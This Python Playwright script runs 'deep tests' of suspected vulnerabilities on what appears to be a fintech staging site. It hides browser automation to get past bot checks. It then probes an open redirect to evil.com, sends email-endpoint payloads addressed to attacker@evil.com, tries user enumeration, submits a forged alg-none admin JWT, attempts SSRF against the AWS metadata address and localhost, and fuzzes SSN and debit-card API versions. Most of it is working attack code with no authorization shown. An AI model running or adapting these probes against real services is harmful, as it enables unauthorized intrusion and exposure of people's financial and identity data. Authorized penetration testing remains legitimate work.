#!/usr/bin/env python3
"""Deep testing of confirmed vulnerabilities."""

import asyncio
import json
from playwright.async_api import async_playwright

BASE_URL = "https://my.staging.found.com"

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-blink-features=AutomationControlled']
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1440, "height": 900},
            locale="en-US"
        )
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
        page = await context.new_page()

        print("[*] Loading page...")
        await page.goto(f"{BASE_URL}/signup", wait_until="domcontentloaded", timeout=30000)
        for i in range(20):
            await page.wait_for_timeout(3000)
            title = await page.title()
            if "Just a moment" not in title:
                break

        # =========================================
        # DEEP TEST: Open Redirect via /api/stripe/redirect
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: Open Redirect via /api/stripe/redirect")
        print("="*60)
        
        # Test with XMLHttpRequest to get the actual redirect location
        resp = await page.evaluate("""
            () => {
                return new Promise((resolve) => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', '/api/stripe/redirect?return_to=https://evil.com', true);
                    xhr.withCredentials = true;
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4) {
                            resolve({
                                status: xhr.status,
                                responseURL: xhr.responseURL,
                                headers: xhr.getAllResponseHeaders(),
                                body: xhr.responseText.substring(0, 500)
                            });
                        }
                    };
                    xhr.send();
                });
            }
        """)
        print(f"  XHR to evil.com: status={resp.get('status')}, responseURL={resp.get('responseURL')}")
        print(f"    headers: {resp.get('headers', '')[:300]}")
        
        # Navigate to the redirect URL directly to see where it leads
        print("\n  Direct navigation test:")
        new_page = await context.new_page()
        redirect_responses = []
        
        def on_response(response):
            redirect_responses.append({
                "url": response.url,
                "status": response.status,
                "headers": dict(response.headers),
            })
        
        new_page.on("response", on_response)
        
        try:
            await new_page.goto(f"{BASE_URL}/api/stripe/redirect?return_to=https://httpbin.org/get", timeout=15000)
        except Exception as e:
            print(f"  Navigation result: {e}")
        
        print(f"  Final URL: {new_page.url}")
        print(f"  Redirect chain ({len(redirect_responses)} responses):")
        for r in redirect_responses:
            loc = r['headers'].get('location', '')
            print(f"    {r['status']} {r['url'][:100]} -> {loc[:100]}")
        
        await new_page.close()

        # Test without auth to see if it still redirects
        print("\n  Test via curl simulation (no cookies):")
        resp = await page.evaluate("""
            async () => {
                try {
                    const r = await fetch('/api/stripe/redirect?return_to=https://httpbin.org/get', {
                        credentials: 'omit',
                        redirect: 'manual'
                    });
                    return {status: r.status, type: r.type};
                } catch(e) { return {error: e.message}; }
            }
        """)
        print(f"  No cookies: {json.dumps(resp)}")

        # =========================================
        # DEEP TEST: Auth Bypass on Business Email Endpoints
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: Auth Bypass on Business Email Endpoints") 
        print("="*60)
        
        # Try to send email to arbitrary address
        test_payloads = [
            {"email": "attacker@evil.com"},
            {"email": "test@test.com", "business_id": "1"},
            {"to": "attacker@evil.com"},
            {"recipient_email": "attacker@evil.com"},
        ]
        
        for payload in test_payloads:
            for ep in ["/api/business/email-direct-deposit-form", "/api/business/email-signed-bank-letter"]:
                resp = await page.evaluate("""
                    async (opts) => {
                        try {
                            const csrfCookie = document.cookie.split(';').map(c => c.trim()).find(c => c.startsWith('csrf_token='));
                            const csrfValue = csrfCookie ? csrfCookie.split('=')[1] : '';
                            const r = await fetch(opts.url, {
                                method: 'POST', credentials: 'include',
                                headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfValue},
                                body: JSON.stringify(opts.body)
                            });
                            return {status: r.status, body: (await r.text()).substring(0, 500)};
                        } catch(e) { return {error: e.message}; }
                    }
                """, {"url": ep, "body": payload})
                print(f"  POST {ep} with {json.dumps(payload)[:80]}:")
                print(f"    Status: {resp.get('status')} | Body: {str(resp.get('body', ''))[:200]}")

        # =========================================
        # DEEP TEST: Error Message Info Disclosure
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: Error Message Information Disclosure")
        print("="*60)

        error_tests = [
            {"method": "POST", "url": "/api/business/email-direct-deposit-form", "body": {"email": "x"}},
            {"method": "POST", "url": "/api/business/email-signed-bank-letter", "body": {"email": "x"}},
            {"method": "POST", "url": "/api/register", "body": {"email": "", "password": ""}},
            {"method": "POST", "url": "/api/verify-register", "body": {"code": ""}},
            {"method": "POST", "url": "/api/send-security-code", "body": {"email": "", "password": ""}},
            {"method": "POST", "url": "/api/change-password", "body": {"old": "", "new": ""}},
            {"method": "POST", "url": "/api/linked-account/v2/link-via-account-routing", "body": {"account_number": "x", "routing_number": "x"}},
            {"method": "POST", "url": "/api/v2/update-name-ssn", "body": {"ssn": "000-00-0000", "first_name": "x", "last_name": "x"}},
        ]

        for test in error_tests:
            resp = await page.evaluate("""
                async (opts) => {
                    try {
                        const csrfCookie = document.cookie.split(';').map(c => c.trim()).find(c => c.startsWith('csrf_token='));
                        const csrfValue = csrfCookie ? csrfCookie.split('=')[1] : '';
                        const r = await fetch(opts.url, {
                            method: opts.method, credentials: 'include',
                            headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfValue},
                            body: JSON.stringify(opts.body)
                        });
                        return {status: r.status, body: (await r.text()).substring(0, 500)};
                    } catch(e) { return {error: e.message}; }
                }
            """, test)
            status = resp.get('status')
            body = str(resp.get('body', ''))
            if status == 500 or 'error' in body.lower() or 'nil' in body or 'method' in body:
                print(f"  [!] {test['method']} {test['url']}: {status}")
                print(f"      {body[:300]}")
            else:
                print(f"  {test['method']} {test['url']}: {status} | {body[:100]}")

        # =========================================
        # DEEP TEST: User Enumeration - Confirm differential responses
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: User Enumeration Confirmation")
        print("="*60)
        
        # Register an account first (or try to)
        reg_resp = await page.evaluate("""
            async () => {
                try {
                    const csrfCookie = document.cookie.split(';').map(c => c.trim()).find(c => c.startsWith('csrf_token='));
                    const csrfValue = csrfCookie ? csrfCookie.split('=')[1] : '';
                    const r = await fetch('/api/register', {
                        method: 'POST', credentials: 'include',
                        headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfValue},
                        body: JSON.stringify({email: 'sectest+enumtest@proton.me', password: 'TestP@ss123!'})
                    });
                    return {status: r.status, body: (await r.text()).substring(0, 1000)};
                } catch(e) { return {error: e.message}; }
            }
        """)
        print(f"  Registration attempt: {reg_resp.get('status')} | {str(reg_resp.get('body', ''))[:200]}")

        # Check if registered email vs non-registered email gives different responses
        for email in ["sectest+enumtest@proton.me", "definitely-not-a-user-xyz123@nonexistent.com"]:
            resp = await page.evaluate("""
                async (email) => {
                    try {
                        const csrfCookie = document.cookie.split(';').map(c => c.trim()).find(c => c.startsWith('csrf_token='));
                        const csrfValue = csrfCookie ? csrfCookie.split('=')[1] : '';
                        const r = await fetch('/api/email-security-code', {
                            method: 'POST', credentials: 'include',
                            headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfValue},
                            body: JSON.stringify({email: email})
                        });
                        return {status: r.status, body: (await r.text()).substring(0, 500)};
                    } catch(e) { return {error: e.message}; }
                }
            """, email)
            print(f"  email-security-code({email}): {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # DEEP TEST: JWT/Token in Accountant Share
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: Accountant Share & Business Contact Login")
        print("="*60)
        
        share_tests = [
            "/api/accountant/client-resources-pdf?invite_code=test",
            "/api/accountant/client-resources-pdf?invite_code=1",
            "/api/business-contact-login/contractor/test",
            "/api/business-contact-login/contractor/1",
        ]
        
        for ep in share_tests:
            resp = await page.evaluate("""
                async (url) => {
                    try {
                        const r = await fetch(url, {credentials: 'include'});
                        return {status: r.status, body: (await r.text()).substring(0, 500)};
                    } catch(e) { return {error: e.message}; }
                }
            """, ep)
            status = resp.get('status')
            body = str(resp.get('body', ''))
            print(f"  GET {ep}: {status} | {body[:200]}")

        # =========================================
        # DEEP TEST: Bulk 1099 Export - JWT Token Reuse
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: Bulk 1099 Export JWT")
        print("="*60)
        
        resp = await page.evaluate("""
            async () => {
                try {
                    const r = await fetch('/api/bulk1099-export/test/download?jwt=eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', {credentials: 'include'});
                    return {status: r.status, body: (await r.text()).substring(0, 500)};
                } catch(e) { return {error: e.message}; }
            }
        """)
        print(f"  With 'none' algorithm JWT: {resp.get('status')} | {str(resp.get('body', ''))[:200]}")

        # =========================================
        # DEEP TEST: Check for SSRF via Plaid/Stripe
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: SSRF Tests")
        print("="*60)
        
        ssrf_tests = [
            {"url": "/api/stripe/redirect?return_to=http://169.254.169.254/latest/meta-data/", "desc": "AWS metadata via stripe redirect"},
            {"url": "/api/stripe/redirect?return_to=http://localhost:3000", "desc": "localhost via stripe redirect"},
            {"url": "/api/stripe/redirect?return_to=http://127.0.0.1:8080", "desc": "loopback via stripe redirect"},
        ]
        
        for test in ssrf_tests:
            new_page = await context.new_page()
            responses = []
            new_page.on("response", lambda r: responses.append({"url": r.url, "status": r.status}))
            try:
                await new_page.goto(f"{BASE_URL}{test['url']}", timeout=10000)
            except Exception as e:
                pass
            print(f"  {test['desc']}: final_url={new_page.url}, responses={len(responses)}")
            for r in responses:
                print(f"    {r['status']} {r['url'][:100]}")
            await new_page.close()

        # =========================================
        # DEEP TEST: API versioning inconsistency
        # =========================================
        print("\n" + "="*60)
        print("DEEP TEST: API Version Fuzzing")
        print("="*60)
        
        version_tests = [
            "/api/v1/update-name-ssn",
            "/api/v1/update-dob",
            "/api/v1/change-verified-phone",
            "/api/v1/business-contact/1",
            "/api/v3/business-contact/1",
            "/api/debit-card/v1/all",
            "/api/debit-card/v2/all",
            "/api/change-email",
            "/api/change-email/v1",
        ]
        
        for ep in version_tests:
            resp = await page.evaluate("""
                async (url) => {
                    try {
                        const r = await fetch(url, {credentials: 'include'});
                        return {status: r.status, body: (await r.text()).substring(0, 200)};
                    } catch(e) { return {error: e.message}; }
                }
            """, ep)
            status = resp.get('status')
            if status != 404:
                print(f"  [!] {ep}: {status} | {str(resp.get('body', ''))[:150]}")
            else:
                print(f"  {ep}: {status}")

        await browser.close()
        print("\n[*] Done!")

asyncio.run(main())
